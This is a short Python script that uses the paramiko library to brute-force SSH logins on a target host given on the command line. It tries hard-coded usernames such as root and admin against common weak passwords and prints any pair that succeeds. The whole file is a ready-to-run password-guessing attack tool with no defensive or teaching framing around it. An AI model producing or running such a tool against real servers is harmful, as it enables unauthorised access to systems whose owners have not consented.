import paramiko
import sys

def brute_force_ssh(host, user_list, pass_list):
    for username in user_list:
        for password in pass_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password)
                print(f"Success: {username}:{password}")
                client.close()
            except Exception:
                pass

if __name__ == "__main__":
    host = sys.argv[1]
    user_list = ["root", "admin", "user"]
    pass_list = ["admin", "password", "123456"]
    brute_force_ssh(host, user_list, pass_list)
